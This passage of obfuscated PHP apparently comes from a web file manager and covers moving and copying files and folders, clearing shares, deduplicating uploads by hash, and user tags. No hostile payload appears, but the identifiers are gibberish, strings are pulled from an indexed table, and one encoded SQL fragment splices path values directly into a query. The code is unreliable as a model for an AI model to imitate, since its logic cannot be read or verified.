$this->fileNameAutoGet($ÒÛÊß•È, $¹¼Í¡ğ, $Æ•çÔŞ†, $Œ¥ú®Ö); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¢Ïç¯³³, $üê­ùÜ”, $‡êÍÜğ‹ = REPEAT_REPLACE, $±“‹¥øğ = '') { $ĞÍÏ…­å =& $_SERVER[Ôó‡è­ƒ]; $­×ÊˆÈÒ = $this->sourceInfo($¢Ïç¯³³); $€Õè« = $this->sourceInfo($üê­ùÜ”); if ($­×ÊˆÈÒ[$ĞÍÏ…­å[494]] == $€Õè«[$ĞÍÏ…­å[399]]) { if ($­×ÊˆÈÒ[$ĞÍÏ…­å[427]] == $ĞÍÏ…­å[89]) { Model($ĞÍÏ…­å[425])->restore(array($¢Ïç¯³³)); } if (!$±“‹¥øğ || $±“‹¥øğ == $­×ÊˆÈÒ[$ĞÍÏ…­å[32]]) { return $¢Ïç¯³³; } } $Ë­“Ûƒ½ = $this->pathInfoMore($¢Ïç¯³³); if ($this->isParentOf($¢Ïç¯³³, $üê­ùÜ”)) { return !1; } if (!$­×ÊˆÈÒ || !$€Õè« || $€Õè«[$ĞÍÏ…­å[407]] != $ĞÍÏ…­å[89]) { return !1; } Hook::trigger($ĞÍÏ…­å[589], $Ë­“Ûƒ½); $this->targetIsDelete = intval($­×ÊˆÈÒ[$ĞÍÏ…­å[427]]); if ($­×ÊˆÈÒ[$ĞÍÏ…­å[494]] == $üê­ùÜ” && $±“‹¥øğ != $­×ÊˆÈÒ[$ĞÍÏ…­å[32]]) { $¨¤èÊªÃ = $this->fileNameExist($üê­ùÜ”, $±“‹¥øğ); if ($¨¤èÊªÃ && $­×ÊˆÈÒ[$ĞÍÏ…­å[407]] == $ĞÍÏ…­å[194]) { $Áú’Ò”÷ = $this->sourceInfo($¨¤èÊªÃ); $ç¨Íöê = $this->fileHistory($Áú’Ò”÷, $­×ÊˆÈÒ[$ĞÍÏ…­å[463]], $­×ÊˆÈÒ[$ĞÍÏ…­å[80]]); if (!$ç¨Íöê) { Model($ĞÍÏ…­å[466])->remove($­×ÊˆÈÒ[$ĞÍÏ…­å[463]]); } $this->removeNow($¢Ïç¯³³, !1); $this->folderSizeReset($üê­ùÜ”); Hook::trigger($ĞÍÏ…­å[590], $Ë­“Ûƒ½); return $¨¤èÊªÃ; } } $•ôî®» = $±“‹¥øğ ? $±“‹¥øğ : $­×ÊˆÈÒ[$ĞÍÏ…­å[32]]; $this->lockMoveStart($¢Ïç¯³³); $this->lockWriteStart($üê­ùÜ”, $•ôî®»); $”†Š— = array($ĞÍÏ…­å[559] => array(), $ĞÍÏ…­å[591] => !1); $this->clearShare($¢Ïç¯³³, $üê­ùÜ”); $©†Ò®¤ğ = $this->fileNameExistCache($üê­ùÜ”, $­×ÊˆÈÒ[$ĞÍÏ…­å[32]]); $±¬òïœã = $this->_move($¢Ïç¯³³, $üê­ùÜ”, $‡êÍÜğ‹, $”†Š—, $±“‹¥øğ); $this->sourceCacheClear(); if ($­×ÊˆÈÒ[$ĞÍÏ…­å[407]] == $ĞÍÏ…­å[89] && $©†Ò®¤ğ) { $this->folderSizeResetChildren($±¬òïœã); } Model($ĞÍÏ…­å[196])->linkAdd($”†Š—[$ĞÍÏ…­å[559]]); if ($©†Ò®¤ğ && $”†Š—[$ĞÍÏ…­å[591]]) { $this->removeNow($¢Ïç¯³³, !1); } $this->lockMoveEnd($¢Ïç¯³³); $this->lockWriteEnd($üê­ùÜ”, $•ôî®»); $this->folderSizeReset($­×ÊˆÈÒ[$ĞÍÏ…­å[494]]); $this->folderSizeReset($üê­ùÜ”); $’¢µÇ™’ = array($­×ÊˆÈÒ[$ĞÍÏ…­å[494]], $üê­ùÜ”); if ($­×ÊˆÈÒ[$ĞÍÏ…­å[407]] == $ĞÍÏ…­å[89]) { $’¢µÇ™’[] = $¢Ïç¯³³; } $this->updateModifyTime($’¢µÇ™’); Model($ĞÍÏ…­å[563])->eventMove($¢Ïç¯³³, $­×ÊˆÈÒ[$ĞÍÏ…­å[494]], $üê­ùÜ”); Hook::trigger($ĞÍÏ…­å[590], $Ë­“Ûƒ½); return $±¬òïœã; } private function _move($ñİåÊ¥®, $Ë„¾ùá–, $‘ ‡ó, &$‡ãíë²‡, $ÙîÈ¹»Ù = '') { $•îÎ§®¡ =& $_SERVER[Ôó‡è­ƒ]; $ÉÙü¢¶í = $this->sourceInfo($ñİåÊ¥®); $—¤ı²Ïß = $ÉÙü¢¶í[$•îÎ§®¡[407]] == $•îÎ§®¡[89]; $ı³¨êî¼ = $ÙîÈ¹»Ù ? $ÙîÈ¹»Ù : $ÉÙü¢¶í[$•îÎ§®¡[32]]; $®Ô‰Ì¾— = $this->fileNameExistCache($Ë„¾ùá–, $ı³¨êî¼); $this->lockMoveStart($ñİåÊ¥®); $this->lockWriteStart($Ë„¾ùá–, $ı³¨êî¼); if (!$®Ô‰Ì¾—) { return $this->_moveForce($ñİåÊ¥®, $Ë„¾ùá–, $ı³¨êî¼); } $©ãÙ•° = $®Ô‰Ì¾—; $“âÊÖ×Ö = !1; if ($—¤ı²Ïß) { if ($‘ ‡ó == REPEAT_RENAME_FOLDER) { $ı³¨êî¼ = $this->fileNameAuto($Ë„¾ùá–, $ı³¨êî¼, $‘ ‡ó, $—¤ı²Ïß); $©ãÙ•° = $this->_moveForce($ñİåÊ¥®, $Ë„¾ùá–, $ı³¨êî¼); } else { if ($‘ ‡ó == REPEAT_RENAME_FOLDER) { $‘ ‡ó = REPEAT_RENAME; } $ïÙÚÛáœ = $this->_childrenListSelect($ñİåÊ¥®); foreach ($ïÙÚÛáœ as $¼›û¿çÏ) { $this->_move($¼›û¿çÏ[$•îÎ§®¡[399]], $®Ô‰Ì¾—, $‘ ‡ó, $‡ãíë²‡); } $“âÊÖ×Ö = !0; } } else { if ($‘ ‡ó == REPEAT_SKIP) { $“âÊÖ×Ö = !0; } else { if ($‘ ‡ó == REPEAT_RENAME || $‘ ‡ó == REPEAT_RENAME_FOLDER) { $ı³¨êî¼ = $this->fileNameAuto($Ë„¾ùá–, $ı³¨êî¼, $‘ ‡ó, $—¤ı²Ïß); $©ãÙ•° = $this->_moveForce($ñİåÊ¥®, $Ë„¾ùá–, $ı³¨êî¼); } else { if ($‘ ‡ó == REPEAT_REPLACE) { $êˆóÙŸª = $this->sourceInfoCache($®Ô‰Ì¾—); $îÚÊÂ½ò = $this->fileHistory($êˆóÙŸª, $ÉÙü¢¶í[$•îÎ§®¡[463]], $ÉÙü¢¶í[$•îÎ§®¡[80]]); $“âÊÖ×Ö = !0; if ($îÚÊÂ½ò) { $‡ãíë²‡[$•îÎ§®¡[559]][] = $ÉÙü¢¶í[$•îÎ§®¡[463]]; } } } } } if ($“âÊÖ×Ö && !$‡ãíë²‡[$•îÎ§®¡[591]]) { $‡ãíë²‡[$•îÎ§®¡[591]] = !0; } return $©ãÙ•°; } private function _moveForce($ÍœÂ¾ğû, $Şº½äù, $…Ò‰ëÁğ) { $ÆĞÔÊş =& $_SERVER[Ôó‡è­ƒ]; $èä³ı™õ = $this->sourceInfo($ÍœÂ¾ğû); $Ÿ¹è„÷™ = $this->sourceInfo($Şº½äù); $÷øŞ½¡ó = $èä³ı™õ[$ÆĞÔÊş[407]] == $ÆĞÔÊş[89]; $§Êò©ÁÁ = array($ÆĞÔÊş[398] => $Ÿ¹è„÷™[$ÆĞÔÊş[399]], $ÆĞÔÊş[583] => $Ÿ¹è„÷™[$ÆĞÔÊş[517]] . $Ÿ¹è„÷™[$ÆĞÔÊş[399]] . $ÆĞÔÊş[50], $ÆĞÔÊş[579] => $Ÿ¹è„÷™[$ÆĞÔÊş[408]], $ÆĞÔÊş[580] => $Ÿ¹è„÷™[$ÆĞÔÊş[501]], $ÆĞÔÊş[582] => USER_ID, $ÆĞÔÊş[417] => $…Ò‰ëÁğ); $²Å†Íş‹ = $èä³ı™õ[$ÆĞÔÊş[408]] == SourceModel::TYPE_GROUP && $Ÿ¹è„÷™[$ÆĞÔÊş[408]] == SourceModel::TYPE_GROUP && $èä³ı™õ[$ÆĞÔÊş[501]] == $Ÿ¹è„÷™[$ÆĞÔÊş[501]]; if (!$²Å†Íş‹ && $this->moveClearAuth) { Model($ÆĞÔÊş[498])->authClear($ÍœÂ¾ğû); } $µß¢×şÂ = $èä³ı™õ[$ÆĞÔÊş[427]] == $ÆĞÔÊş[89] && $Ÿ¹è„÷™[$ÆĞÔÊş[427]] != $ÆĞÔÊş[89]; if ($µß¢×şÂ) { $§Êò©ÁÁ[$ÆĞÔÊş[426]] = 0; } if ($÷øŞ½¡ó) { $–áìÔ«Û = array($ÆĞÔÊş[583] => array($ÆĞÔÊş[543], $èä³ı™õ[$ÆĞÔÊş[517]] . $èä³ı™õ[$ÆĞÔÊş[399]] . $ÆĞÔÊş[544])); $Ñ‹×œÚİ = $èä³ı™õ[$ÆĞÔÊş[517]] . $èä³ı™õ[$ÆĞÔÊş[399]] . $ÆĞÔÊş[50]; $”„Ñ±„Í = $Ÿ¹è„÷™[$ÆĞÔÊş[517]] . $Ÿ¹è„÷™[$ÆĞÔÊş[399]] . $ÆĞÔÊş[50] . $èä³ı™õ[$ÆĞÔÊş[399]] . $ÆĞÔÊş[50]; $ä¯İ»Ò = array($ÆĞÔÊş[583] => array($ÆĞÔÊş[592], "\x72\145\160\154\141\143\x65\x28\160\141\162\x65\156\x74\x4c\145\x76\x65\x6c\x2c\x27{$Ñ‹×œÚİ}\47\54\47{$”„Ñ±„Í}\47\51"), $ÆĞÔÊş[579] => $Ÿ¹è„÷™[$ÆĞÔÊş[408]], $ÆĞÔÊş[580] => $Ÿ¹è„÷™[$ÆĞÔÊş[501]]); if ($µß¢×şÂ) { $ä¯İ»Ò[$ÆĞÔÊş[426]] = 0; } $this->where($–áìÔ«Û)->data($ä¯İ»Ò)->save(); } $this->where(array($ÆĞÔÊş[414] => $ÍœÂ¾ğû))->data($§Êò©ÁÁ)->save(); return $ÍœÂ¾ğû; } private function clearShare($Ë†²ã½Š, $ÅÌ°Å×é) { $“­ı÷¬ =& $_SERVER[Ôó‡è­ƒ]; $ ²«Øš = $this->sourceInfo($Ë†²ã½Š); $îÃ¨è‰© = $this->sourceInfo($ÅÌ°Å×é); if ($ ²«Øš[$“­ı÷¬[501]] == $îÃ¨è‰©[$“­ı÷¬[501]] && $ ²«Øš[$“­ı÷¬[408]] == $“­ı÷¬[593]) { return; } $ù¹áÒ‹ô = array($“­ı÷¬[517] => array($“­ı÷¬[543], $ ²«Øš[$“­ı÷¬[517]] . $Ë†²ã½Š . $“­ı÷¬[544])); $ĞŞ•Ë ¨ = $this->field($“­ı÷¬[414])->where($ù¹áÒ‹ô)->getField($“­ı÷¬[399], !0); if (!$ĞŞ•Ë ¨) { return; } $ù¹áÒ‹ô = array($“­ı÷¬[399] => array($“­ı÷¬[7], $ĞŞ•Ë ¨), $“­ı÷¬[491] => 1); $ÃœœÃÛÃ = Model($“­ı÷¬[594])->field($“­ı÷¬[484])->where($ù¹áÒ‹ô)->select(); if (!$ÃœœÃÛÃ) { return; } $ÃœœÃÛÃ = array_to_keyvalue($ÃœœÃÛÃ, $“­ı÷¬[12], $“­ı÷¬[484]); $ù¹áÒ‹ô = array($“­ı÷¬[484] => array($“­ı÷¬[7], $ÃœœÃÛÃ)); Model($“­ı÷¬[594])->where($ù¹áÒ‹ô)->save(array($“­ı÷¬[491] => 0)); Model($“­ı÷¬[595])->where($ù¹áÒ‹ô)->delete(); } public function copyFolderFromIO($ÄÀä¢÷Æ, $åöı¼Ê , $—ÊÏ®µê, $İÓ¦¿à¡, $§¤¾ µ, $ÂÒÂÛØ› = false) { $úÄÉ£¹Ş =& $_SERVER[Ôó‡è­ƒ]; $Óà¿úó› = array($úÄÉ£¹Ş[560] => array(), $úÄÉ£¹Ş[561] => array(), $úÄÉ£¹Ş[559] => array(), $úÄÉ£¹Ş[596] => array()); $‰ÙĞ†ßÂ = $ÂÒÂÛØ› ? $ÂÒÂÛØ› : $ÄÀä¢÷Æ->pathThis($åöı¼Ê ); $Ï‹Ë†–³ = $this->fileNameExist($—ÊÏ®µê, $‰ÙĞ†ßÂ); $ÃÕÈÏÅ = $this->mkdir($—ÊÏ®µê, $‰ÙĞ†ßÂ, $İÓ¦¿à¡); if (!$Ï‹Ë†–³ || $İÓ¦¿à¡ == REPEAT_RENAME_FOLDER) { $İÓ¦¿à¡ = !1; } if ($Ï‹Ë†–³) { $this->_childrenAllMake($Ï‹Ë†–³); } Hook::trigger($úÄÉ£¹Ş[597]); $this->_copyChildTo($ÄÀä¢÷Æ, $åöı¼Ê , $ÃÕÈÏÅ, $İÓ¦¿à¡, $Óà¿úó›, $§¤¾ µ); Hook::trigger($úÄÉ£¹Ş[598]); if ($ÃÕÈÏÅ) { $this->folderSizeResetChildren($ÃÕÈÏÅ); } $this->_childrenListClear(); Model($úÄÉ£¹Ş[562])->addAll($Óà¿úó›[$úÄÉ£¹Ş[560]], array(), !0); Model($úÄÉ£¹Ş[563])->eventCopy($ÃÕÈÏÅ); $this->saveAll($Óà¿úó›[$úÄÉ£¹Ş[561]]); Model($úÄÉ£¹Ş[466])->linkAdd($Óà¿úó›[$úÄÉ£¹Ş[559]]); Model($úÄÉ£¹Ş[466])->remove($Óà¿úó›[$úÄÉ£¹Ş[596]]); $this->folderSizeReset($—ÊÏ®µê); $this->updateModifyTime($—ÊÏ®µê); return $ÃÕÈÏÅ; } private function _copyChildTo($ã£ˆ•ĞÂ, $¿Ó“øÍÇ, $«ıÜòÙü, $¬°ê½à½, &$à›Ò¬¬¨, $˜ïÆå©µ) { $½£³çÙÁ =& $_SERVER[Ôó‡è­ƒ]; $Š´ÕÙË¼ = $this->sourceInfoCache($«ıÜòÙü); $¯ÒÆÊÚù = $ã£ˆ•ĞÂ->listPath($¿Ó“øÍÇ); $¯ÒÆÊÚù = $¯ÒÆÊÚù ? $¯ÒÆÊÚù : array($½£³çÙÁ[76] => array(), $½£³çÙÁ[77] => array()); $ñ·Ú¬“ş = array_merge($¯ÒÆÊÚù[$½£³çÙÁ[76]], $¯ÒÆÊÚù[$½£³çÙÁ[77]]); $’ç¬Ûş‰ = $this->_addFiles($ã£ˆ•ĞÂ, $¯ÒÆÊÚù[$½£³çÙÁ[76]], $˜ïÆå©µ); $—İÚÔ¢À = array(); foreach ($ñ·Ú¬“ş as &$Ï½œ¥ï£) { if (isset($’ç¬Ûş‰[$Ï½œ¥ï£[$½£³çÙÁ[32]]])) { $Ï½œ¥ï£ = $’ç¬Ûş‰[$Ï½œ¥ï£[$½£³çÙÁ[32]]]; } $Ï½œ¥ï£[$½£³çÙÁ[407]] = $Ï½œ¥ï£[$½£³çÙÁ[33]] == $½£³çÙÁ[79]; $Ï½œ¥ï£[$½£³çÙÁ[409]] = _get($Ï½œ¥ï£, $½£³çÙÁ[171], $½£³çÙÁ[12]); $Ï½œ¥ï£[$½£³çÙÁ[80]] = _get($Ï½œ¥ï£, $½£³çÙÁ[80], 0); $Ï½œ¥ï£[$½£³çÙÁ[463]] = _get($Ï½œ¥ï£, $½£³çÙÁ[463], 0); if (!isset($Ï½œ¥ï£[$½£³çÙÁ[599]]) && $Ï½œ¥ï£[$½£³çÙÁ[463]]) { $à›Ò¬¬¨[$½£³çÙÁ[596]][] = $Ï½œ¥ï£[$½£³çÙÁ[463]]; } if ($¬°ê½à½) { $†˜ÈıÆÔ = $this->fileNameExistCache($«ıÜòÙü, $Ï½œ¥ï£[$½£³çÙÁ[32]]); if ($†˜ÈıÆÔ) { if ($Ï½œ¥ï£[$½£³çÙÁ[407]] || $¬°ê½à½ == REPEAT_SKIP) { continue; } if ($¬°ê½à½ == REPEAT_REPLACE) { $ĞËë™õ = $this->sourceInfoCache($†˜ÈıÆÔ); $¸³àŒ¨º = $this->fileHistory($ĞËë™õ, $Ï½œ¥ï£[$½£³çÙÁ[463]], $Ï½œ¥ï£[$½£³çÙÁ[80]]); if ($¸³àŒ¨º) { $à›Ò¬¬¨[$½£³çÙÁ[559]][] = $Ï½œ¥ï£[$½£³çÙÁ[463]]; } continue; } else { if ($¬°ê½à½ == REPEAT_RENAME) { $Ï½œ¥ï£[$½£³çÙÁ[32]] = $this->fileNameAutoCache($«ıÜòÙü, $Ï½œ¥ï£[$½£³çÙÁ[32]], $¬°ê½à½, !1); } } } } if (!$Ï½œ¥ï£[$½£³çÙÁ[407]] && $Ï½œ¥ï£[$½£³çÙÁ[463]] == 0) { continue; } if (!$Ï½œ¥ï£[$½£³çÙÁ[407]] && $Ï½œ¥ï£[$½£³çÙÁ[463]]) { $à›Ò¬¬¨[$½£³çÙÁ[559]][] = $Ï½œ¥ï£[$½£³çÙÁ[463]]; } $—İÚÔ¢À[] = $this->_makeItemData($Ï½œ¥ï£, $Š´ÕÙË¼, $Ï½œ¥ï£[$½£³çÙÁ[32]]); } unset($Ï½œ¥ï£); if (!empty($—İÚÔ¢À)) { $this->addAll($—İÚÔ¢À); $this->_childrenListSelect($«ıÜòÙü); } $‚Óêñ¯³ = $this->_childrenList($«ıÜòÙü); $‚Óêñ¯³ = array_to_keyvalue($‚Óêñ¯³, $½£³çÙÁ[32]); foreach ($ñ·Ú¬“ş as $Ï½œ¥ï£) { $ĞËë™õ = $‚Óêñ¯³[$Ï½œ¥ï£[$½£³çÙÁ[32]]]; $º¨‰©Ô = $ĞËë™õ[$½£³çÙÁ[399]]; $this->_copyApplyMeta($ĞËë™õ, $à›Ò¬¬¨); if ($Ï½œ¥ï£[$½£³çÙÁ[33]] == $½£³çÙÁ[79]) { $Ï½œ¥ï£[$½£³çÙÁ[78]] = $ã£ˆ•ĞÂ->getPathInner($Ï½œ¥ï£[$½£³çÙÁ[78]]); $this->_copyChildTo($ã£ˆ•ĞÂ, $Ï½œ¥ï£[$½£³çÙÁ[78]], $º¨‰©Ô, $¬°ê½à½, $à›Ò¬¬¨, $˜ïÆå©µ); } } } private function _addFiles($­Ä—îıÃ, $ü“öË•÷, $”İïöùŞ) { $Õ£¢ô¨ =& $_SERVER[Ôó‡è­ƒ]; if (!$ü“öË•÷ || count($ü“öË•÷) == 0) { return array(); } $«¶­­Å = array(); foreach ($ü“öË•÷ as &$»ÛœÏ˜¬) { Hook::trigger($Õ£¢ô¨[600], $»ÛœÏ˜¬); $»ÛœÏ˜¬[$Õ£¢ô¨[78]] = $­Ä—îıÃ->getPathInner($»ÛœÏ˜¬[$Õ£¢ô¨[78]]); $´´Òşüé = $­Ä—îıÃ->hashSimple($»ÛœÏ˜¬[$Õ£¢ô¨[78]]); $ğ‘¨ï = $­Ä—îıÃ->hashMd5($»ÛœÏ˜¬[$Õ£¢ô¨[78]]); if (strlen($ğ‘¨ï) > 10 && !isset($«¶­­Å[$ğ‘¨ï])) { $«¶­­Å[$ğ‘¨ï] = array(); } $»ÛœÏ˜¬[$Õ£¢ô¨[174]] = $´´Òşüé; $»ÛœÏ˜¬[$Õ£¢ô¨[173]] = $ğ‘¨ï; Hook::trigger($Õ£¢ô¨[601], $»ÛœÏ˜¬); $«¶­­Å[$ğ‘¨ï][] =& $»ÛœÏ˜¬; if (count($«¶­­Å[$ğ‘¨ï]) > 1) { $»ÛœÏ˜¬[$Õ£¢ô¨[599]] = !0; } } unset($»ÛœÏ˜¬); $¤¿ì¨Äº = array($Õ£¢ô¨[173] => array($Õ£¢ô¨[7], array_keys($«¶­­Å))); $ìñÖéÈ = Model($Õ£¢ô¨[602]); $îßìß– = $ìñÖéÈ->where($¤¿ì¨Äº)->select(); $îßìß– = $îßìß– ? $îßìß– : array(); foreach ($îßìß– as $³±½Ò¯) { if (!isset($«¶­­Å[$³±½Ò¯[$Õ£¢ô¨[173]]])) { continue; } $Òá—ÒÉê = $«¶­­Å[$³±½Ò¯[$Õ£¢ô¨[173]]]; foreach ($Òá—ÒÉê as &$»ÛœÏ˜¬) { $»ÛœÏ˜¬[$Õ£¢ô¨[463]] = $³±½Ò¯[$Õ£¢ô¨[463]]; $»ÛœÏ˜¬[$Õ£¢ô¨[599]] = !0; } unset($»ÛœÏ˜¬); } $—˜¿ëìé = array(); foreach ($ü“öË•÷ as $íÄéÏâ) { if (isset($íÄéÏâ[$Õ£¢ô¨[599]]) && $íÄéÏâ[$Õ£¢ô¨[599]]) { continue; } $ş°ÕäÑŞ = $­Ä—îıÃ->getPathInner($íÄéÏâ[$Õ£¢ô¨[78]]); $ÄÍî¡ŸÔ = $ìñÖéÈ->addFileMake($ş°ÕäÑŞ, $íÄéÏâ[$Õ£¢ô¨[80]], $íÄéÏâ[$Õ£¢ô¨[174]], $íÄéÏâ[$Õ£¢ô¨[173]], $íÄéÏâ[$Õ£¢ô¨[32]], $”İïöùŞ); if (!is_array($ÄÍî¡ŸÔ)) { continue; } $—˜¿ëìé[] = $ÄÍî¡ŸÔ; } $ìñÖéÈ->addAll($—˜¿ëìé); $¤¿ì¨Äº = array($Õ£¢ô¨[173] => array($Õ£¢ô¨[7], array_keys($«¶­­Å))); $îßìß– = $ìñÖéÈ->where($¤¿ì¨Äº)->select(); $îßìß– = $îßìß– ? $îßìß– : array(); foreach ($îßìß– as $³±½Ò¯) { if (!isset($«¶­­Å[$³±½Ò¯[$Õ£¢ô¨[173]]])) { continue; } $ë¯Ä‡´ú =& $«¶­­Å[$³±½Ò¯[$Õ£¢ô¨[173]]]; foreach ($ë¯Ä‡´ú as &$»ÛœÏ˜¬) { $»ÛœÏ˜¬[$Õ£¢ô¨[463]] = $³±½Ò¯[$Õ£¢ô¨[463]]; } unset($»ÛœÏ˜¬); } $ˆ‘æ›îú = array(); foreach ($ü“öË•÷ as $ËĞÎ•Â¶) { $ˆ‘æ›îú[$ËĞÎ•Â¶[$Õ£¢ô¨[32]]] = $ËĞÎ•Â¶; } return $ˆ‘æ›îú; } } goto D—·êôÂ•; Fç˜ÜŠ™ËŒ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\x66\x61\166"; protected function cacheFunctionAlias($©´–ğíï) { $¿Ö…¾© =& $_SERVER[Ôó‡è­ƒ]; return array($¿Ö…¾©[1933] => array(USER_ID, $¿Ö…¾©[1934])); } protected function listData() { $°œ½®ë =& $_SERVER[Ôó‡è­ƒ]; $¸•Ÿ¯¤÷ = array($°œ½®ë[1646] => USER_ID, $°œ½®ë[479] => array($°œ½®ë[1937], 0)); $ôÛÅ‰©ë = $°œ½®ë[1939]; $”ŸÈÑ°ö = $this->field($ôÛÅ‰©ë)->where($¸•Ÿ¯¤÷)->order($°œ½®ë[1940])->select(); return $”ŸÈÑ°ö ? $”ŸÈÑ°ö : array(); } protected function listByTag($äæ˜ã¨¸) { } protected function addToTag($ºÛõİÆÁ, $¹šé²²Í) { $‘ü¶Ú¸ğ =& $_SERVER[Ôó‡è­ƒ]; if (!Model($‘ü¶Ú¸ğ[2074])->listData($¹šé²²Í) || !Model($‘ü¶Ú¸ğ[823])->pathInfo($ºÛõİÆÁ)) { return !1; } $ÑåÒ¨›£ = array($‘ü¶Ú¸ğ[1646] => USER_ID, $‘ü¶Ú¸ğ[479] => $¹šé²²Í, $‘ü¶Ú¸ğ[418] => $ºÛõİÆÁ, $‘ü¶Ú¸ğ[419] => $‘ü¶Ú¸ğ[413], $‘ü¶Ú¸ğ[417] => $‘ü¶Ú¸ğ[12], $‘ü¶Ú¸ğ[1827] => 0); if ($this->where($ÑåÒ¨›£)->find()) { return !1; } return $this->add($ÑåÒ¨›£); } protected function removeFromTag($Üüãˆ­ã, $¹†á˜í) { $è‚å„Ò» =& $_SERVER[Ôó‡è­ƒ]; if (!Model($è‚å„Ò»[2074])->listData($¹†á˜í)) { return !1; } if (is_array($Üüãˆ­ã)) { $Üüãˆ­ã = array($è‚å„Ò»[7], $Üüãˆ­ã); } $Š¾ÅÅÇ = array($è‚å„Ò»[1646] => USER_ID, $è‚å„Ò»[479] => $¹†á˜í, $è‚å„Ò»[419] => $è‚å„Ò»[413], $è‚å„Ò»[418] => $Üüãˆ­ã); return $this->where($Š¾ÅÅÇ)->delete(); } protected function removeByTag($¼á¾£ŞØ) { $°•Ñ–ƒ¿ =& $_SERVER[Ôó‡è­ƒ]; if (!$¼á¾£ŞØ) { return !1; } $Ô»©ù£û = array($°•Ñ–ƒ¿[1646] => USER_ID, $°•Ñ–ƒ¿[479] => $¼á¾£ŞØ); return $this->where($Ô»©ù£û)->delete(); } protected function removeBySource($õôˆÙÚ) { $ÜšåğË =& $_SERVER[Ôó‡è­ƒ]; if (is_array($õôˆÙÚ)) { $õôˆÙÚ = array($ÜšåğË[7], $õôˆÙÚ); } $Ë³ıÀš´ = array($ÜšåğË[1646] => USER_ID, $ÜšåğË[418] => $õôˆÙÚ, $ÜšåğË[479] => array($ÜšåğË[1014], 0)); return $this->where($Ë³ıÀš´)->delete(); } }